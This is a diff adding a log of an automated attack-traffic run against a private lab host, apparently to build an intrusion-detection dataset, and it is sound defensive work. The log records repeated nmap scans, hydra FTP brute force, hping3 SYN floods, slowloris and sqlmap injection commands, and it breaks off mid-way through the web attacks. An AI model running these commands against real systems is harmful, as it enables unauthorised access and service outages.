@@ -1,0 +1,446 @@
+[2026-09-04T17:02:31.267346] === Flushing iptables before recon_attack.py ===
+[2026-09-04T17:02:31.830073] Victim iptables flushed + management SSH rule re-added.
+[2026-09-04T17:02:31.830111] === Starting recon_attack.py with 35 sessions ===
+[recon_aws_001] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_001] TIMED OUT after 120s (likely blocked mid-scan)
+[recon_aws_001] Logged. Duration: 120.11s
+[recon_aws_002] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_002] Logged. Duration: 2.06s
+[recon_aws_003] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_003] Logged. Duration: 9.46s
+[recon_aws_004] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_004] Logged. Duration: 2.06s
+[recon_aws_005] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_005] Logged. Duration: 2.06s
+[recon_aws_006] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_006] Logged. Duration: 9.45s
+[recon_aws_007] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_007] Logged. Duration: 2.06s
+[recon_aws_008] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_008] Logged. Duration: 2.05s
+[recon_aws_009] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_009] Logged. Duration: 9.46s
+[recon_aws_010] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_010] Logged. Duration: 2.06s
+[recon_aws_011] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_011] Logged. Duration: 2.06s
+[recon_aws_012] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_012] Logged. Duration: 9.46s
+[recon_aws_013] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_013] Logged. Duration: 2.05s
+[recon_aws_014] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_014] Logged. Duration: 2.06s
+[recon_aws_015] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_015] Logged. Duration: 9.46s
+[recon_aws_016] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_016] Logged. Duration: 2.06s
+[recon_aws_017] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_017] Logged. Duration: 2.06s
+[recon_aws_018] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_018] Logged. Duration: 9.46s
+[recon_aws_019] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_019] Logged. Duration: 2.06s
+[recon_aws_020] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_020] Logged. Duration: 2.06s
+[recon_aws_021] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_021] Logged. Duration: 9.46s
+[recon_aws_022] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_022] Logged. Duration: 2.06s
+[recon_aws_023] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_023] Logged. Duration: 2.06s
+[recon_aws_024] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_024] Logged. Duration: 9.46s
+[recon_aws_025] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_025] Logged. Duration: 2.06s
+[recon_aws_026] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_026] Logged. Duration: 2.06s
+[recon_aws_027] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_027] Logged. Duration: 9.46s
+[recon_aws_028] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_028] Logged. Duration: 2.06s
+[recon_aws_029] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_029] Logged. Duration: 2.06s
+[recon_aws_030] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_030] Logged. Duration: 9.46s
+[recon_aws_031] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_031] Logged. Duration: 2.06s
+[recon_aws_032] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_032] Logged. Duration: 2.06s
+[recon_aws_033] Starting: nmap -sS -T2 -p 1-150 10.0.9.216
+[recon_aws_033] Logged. Duration: 9.45s
+[recon_aws_034] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_034] Logged. Duration: 2.06s
+[recon_aws_035] Starting: nmap -sS -T4 -p- 10.0.9.216
+[recon_aws_035] Logged. Duration: 2.06s
+[2026-09-04T17:12:53.348309] === Finished recon_attack.py. Sleeping 60s before next category ===
+[2026-09-04T17:13:53.348493] === Flushing iptables before bruteforce_attack.py ===
+[2026-09-04T17:13:53.894245] Victim iptables flushed + management SSH rule re-added.
+[2026-09-04T17:13:53.894293] === Starting bruteforce_attack.py with 35 sessions ===
+[bruteforce_aws_001] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_001] Logged. Duration: 42.67s
+[bruteforce_aws_002] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_002] Logged. Duration: 32.28s
+[bruteforce_aws_003] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_003] Logged. Duration: 90.03s
+[bruteforce_aws_004] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_004] Logged. Duration: 42.28s
+[bruteforce_aws_005] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_005] Logged. Duration: 32.35s
+[bruteforce_aws_006] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_006] Logged. Duration: 90.02s
+[bruteforce_aws_007] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_007] Logged. Duration: 42.27s
+[bruteforce_aws_008] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_008] Logged. Duration: 32.34s
+[bruteforce_aws_009] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_009] Logged. Duration: 90.07s
+[bruteforce_aws_010] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_010] Logged. Duration: 42.36s
+[bruteforce_aws_011] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_011] Logged. Duration: 32.34s
+[bruteforce_aws_012] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_012] Logged. Duration: 90.04s
+[bruteforce_aws_013] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_013] Logged. Duration: 42.28s
+[bruteforce_aws_014] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_014] Logged. Duration: 32.36s
+[bruteforce_aws_015] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_015] Logged. Duration: 90.04s
+[bruteforce_aws_016] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_016] Logged. Duration: 42.36s
+[bruteforce_aws_017] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_017] Logged. Duration: 32.35s
+[bruteforce_aws_018] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_018] Logged. Duration: 90.02s
+[bruteforce_aws_019] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_019] Logged. Duration: 42.27s
+[bruteforce_aws_020] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_020] Logged. Duration: 32.34s
+[bruteforce_aws_021] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_021] Logged. Duration: 90.02s
+[bruteforce_aws_022] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_022] Logged. Duration: 42.36s
+[bruteforce_aws_023] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_023] Logged. Duration: 32.35s
+[bruteforce_aws_024] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_024] Logged. Duration: 90.02s
+[bruteforce_aws_025] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_025] Logged. Duration: 42.36s
+[bruteforce_aws_026] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_026] Logged. Duration: 32.34s
+[bruteforce_aws_027] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_027] Logged. Duration: 90.02s
+[bruteforce_aws_028] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_028] Logged. Duration: 42.27s
+[bruteforce_aws_029] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_029] Logged. Duration: 32.35s
+[bruteforce_aws_030] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_030] Logged. Duration: 90.03s
+[bruteforce_aws_031] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_031] Logged. Duration: 42.27s
+[bruteforce_aws_032] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_032] Logged. Duration: 32.35s
+[bruteforce_aws_033] Starting: hydra -t 1 -W 3 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_033] Logged. Duration: 90.02s
+[bruteforce_aws_034] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_034] Logged. Duration: 42.36s
+[bruteforce_aws_035] Starting: hydra -t 4 -l testuser -P /home/ubuntu/wordlist.txt ftp://10.0.9.216
+[bruteforce_aws_035] Logged. Duration: 32.34s
+[2026-09-04T18:23:15.492466] === Finished bruteforce_attack.py. Sleeping 60s before next category ===
+[2026-09-04T18:24:15.492620] === Flushing iptables before dos_volumetric_attack.py ===
+[2026-09-04T18:24:16.099797] Victim iptables flushed + management SSH rule re-added.
+[2026-09-04T18:24:16.099848] === Starting dos_volumetric_attack.py with 35 sessions ===
+[dos_volumetric_aws_001] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_001] Logged. Duration: 10.02s
+[dos_volumetric_aws_002] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_002] Logged. Duration: 10.02s
+[dos_volumetric_aws_003] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_003] Logged. Duration: 10.02s
+[dos_volumetric_aws_004] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_004] Logged. Duration: 10.02s
+[dos_volumetric_aws_005] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_005] Logged. Duration: 10.02s
+[dos_volumetric_aws_006] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_006] Logged. Duration: 10.02s
+[dos_volumetric_aws_007] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_007] Logged. Duration: 10.02s
+[dos_volumetric_aws_008] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_008] Logged. Duration: 10.02s
+[dos_volumetric_aws_009] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_009] Logged. Duration: 10.02s
+[dos_volumetric_aws_010] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_010] Logged. Duration: 10.02s
+[dos_volumetric_aws_011] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_011] Logged. Duration: 10.02s
+[dos_volumetric_aws_012] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_012] Logged. Duration: 10.02s
+[dos_volumetric_aws_013] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_013] Logged. Duration: 10.02s
+[dos_volumetric_aws_014] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_014] Logged. Duration: 10.02s
+[dos_volumetric_aws_015] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_015] Logged. Duration: 10.02s
+[dos_volumetric_aws_016] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_016] Logged. Duration: 10.02s
+[dos_volumetric_aws_017] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_017] Logged. Duration: 10.02s
+[dos_volumetric_aws_018] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_018] Logged. Duration: 10.02s
+[dos_volumetric_aws_019] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_019] Logged. Duration: 10.02s
+[dos_volumetric_aws_020] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_020] Logged. Duration: 10.02s
+[dos_volumetric_aws_021] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_021] Logged. Duration: 10.02s
+[dos_volumetric_aws_022] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_022] Logged. Duration: 10.02s
+[dos_volumetric_aws_023] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_023] Logged. Duration: 10.02s
+[dos_volumetric_aws_024] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_024] Logged. Duration: 10.02s
+[dos_volumetric_aws_025] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_025] Logged. Duration: 10.02s
+[dos_volumetric_aws_026] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_026] Logged. Duration: 10.02s
+[dos_volumetric_aws_027] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_027] Logged. Duration: 10.02s
+[dos_volumetric_aws_028] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_028] Logged. Duration: 10.02s
+[dos_volumetric_aws_029] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_029] Logged. Duration: 10.02s
+[dos_volumetric_aws_030] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_030] Logged. Duration: 10.02s
+[dos_volumetric_aws_031] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_031] Logged. Duration: 10.02s
+[dos_volumetric_aws_032] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_032] Logged. Duration: 10.02s
+[dos_volumetric_aws_033] Starting: timeout 10 hping3 -S -p 80 -i u1000 10.0.9.216
+[dos_volumetric_aws_033] Logged. Duration: 10.02s
+[dos_volumetric_aws_034] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_034] Logged. Duration: 10.02s
+[dos_volumetric_aws_035] Starting: timeout 10 hping3 -S -p 80 -i u500 10.0.9.216
+[dos_volumetric_aws_035] Logged. Duration: 10.02s
+[2026-09-04T19:08:01.891313] === Finished dos_volumetric_attack.py. Sleeping 60s before next category ===
+[2026-09-04T19:09:01.891493] === Flushing iptables before dos_slowloris_attack.py ===
+[2026-09-04T19:09:02.571748] Victim iptables flushed + management SSH rule re-added.
+[2026-09-04T19:09:02.571799] === Starting dos_slowloris_attack.py with 35 sessions ===
+[dos_slowloris_aws_001] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_001] Logged. Duration: 20.03s
+[dos_slowloris_aws_002] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_002] Logged. Duration: 20.03s
+[dos_slowloris_aws_003] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_003] Logged. Duration: 20.03s
+[dos_slowloris_aws_004] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_004] Logged. Duration: 20.03s
+[dos_slowloris_aws_005] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_005] Logged. Duration: 20.03s
+[dos_slowloris_aws_006] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_006] Logged. Duration: 20.03s
+[dos_slowloris_aws_007] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_007] Logged. Duration: 20.03s
+[dos_slowloris_aws_008] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_008] Logged. Duration: 20.03s
+[dos_slowloris_aws_009] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_009] Logged. Duration: 20.04s
+[dos_slowloris_aws_010] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_010] Logged. Duration: 20.03s
+[dos_slowloris_aws_011] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_011] Logged. Duration: 20.03s
+[dos_slowloris_aws_012] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_012] Logged. Duration: 20.04s
+[dos_slowloris_aws_013] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_013] Logged. Duration: 20.03s
+[dos_slowloris_aws_014] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_014] Logged. Duration: 20.03s
+[dos_slowloris_aws_015] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_015] Logged. Duration: 20.03s
+[dos_slowloris_aws_016] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_016] Logged. Duration: 20.03s
+[dos_slowloris_aws_017] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_017] Logged. Duration: 20.03s
+[dos_slowloris_aws_018] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_018] Logged. Duration: 20.03s
+[dos_slowloris_aws_019] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_019] Logged. Duration: 20.03s
+[dos_slowloris_aws_020] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_020] Logged. Duration: 20.03s
+[dos_slowloris_aws_021] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_021] Logged. Duration: 20.03s
+[dos_slowloris_aws_022] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_022] Logged. Duration: 20.03s
+[dos_slowloris_aws_023] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_023] Logged. Duration: 20.05s
+[dos_slowloris_aws_024] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_024] Logged. Duration: 20.03s
+[dos_slowloris_aws_025] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_025] Logged. Duration: 20.03s
+[dos_slowloris_aws_026] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_026] Logged. Duration: 20.03s
+[dos_slowloris_aws_027] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_027] Logged. Duration: 20.03s
+[dos_slowloris_aws_028] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_028] Logged. Duration: 20.03s
+[dos_slowloris_aws_029] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_029] Logged. Duration: 20.03s
+[dos_slowloris_aws_030] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_030] Logged. Duration: 20.03s
+[dos_slowloris_aws_031] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_031] Logged. Duration: 20.03s
+[dos_slowloris_aws_032] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_032] Logged. Duration: 20.03s
+[dos_slowloris_aws_033] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 25
+[dos_slowloris_aws_033] Logged. Duration: 20.03s
+[dos_slowloris_aws_034] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_034] Logged. Duration: 20.03s
+[dos_slowloris_aws_035] Starting: timeout 20 python3 slowloris/slowloris.py 10.0.9.216 -p 80 -s 50
+[dos_slowloris_aws_035] Logged. Duration: 20.05s
+[2026-09-04T19:46:58.753435] === Finished dos_slowloris_attack.py. Sleeping 60s before next category ===
+[2026-09-04T19:47:58.753608] === Flushing iptables before web_attack.py ===
+[2026-09-04T19:47:59.651237] Victim iptables flushed + management SSH rule re-added.
+[2026-09-04T19:47:59.651294] === Starting web_attack.py with 35 sessions ===
+[webattack_aws_001] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_001] Logged. Duration: 15.43s
+[webattack_aws_002] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_002] Logged. Duration: 11.33s
+[webattack_aws_003] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_003] Logged. Duration: 11.33s
+[webattack_aws_004] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_004] Logged. Duration: 11.32s
+[webattack_aws_005] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_005] Logged. Duration: 11.32s
+[webattack_aws_006] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_006] Logged. Duration: 11.33s
+[webattack_aws_007] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_007] Logged. Duration: 11.33s
+[webattack_aws_008] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_008] Logged. Duration: 11.33s
+[webattack_aws_009] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_009] Logged. Duration: 11.33s
+[webattack_aws_010] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_010] Logged. Duration: 11.32s
+[webattack_aws_011] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_011] Logged. Duration: 11.33s
+[webattack_aws_012] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_012] Logged. Duration: 11.33s
+[webattack_aws_013] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_013] Logged. Duration: 11.32s
+[webattack_aws_014] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_014] Logged. Duration: 11.33s
+[webattack_aws_015] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_015] Logged. Duration: 11.33s
+[webattack_aws_016] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_016] Logged. Duration: 11.33s
+[webattack_aws_017] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_017] Logged. Duration: 11.33s
+[webattack_aws_018] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_018] Logged. Duration: 11.33s
+[webattack_aws_019] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_019] Logged. Duration: 11.32s
+[webattack_aws_020] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_020] Logged. Duration: 11.33s
+[webattack_aws_021] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_021] Logged. Duration: 11.33s
+[webattack_aws_022] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_022] Logged. Duration: 11.33s
+[webattack_aws_023] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --dbs
+[webattack_aws_023] Logged. Duration: 11.33s
+[webattack_aws_024] Starting: sqlmap -u "http://10.0.9.216/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=REDACTED" --batch --timeout=5 --retries=1 --level=1 --risk=1
+[webattack_aws_024] Logged. Duration: 11.33s
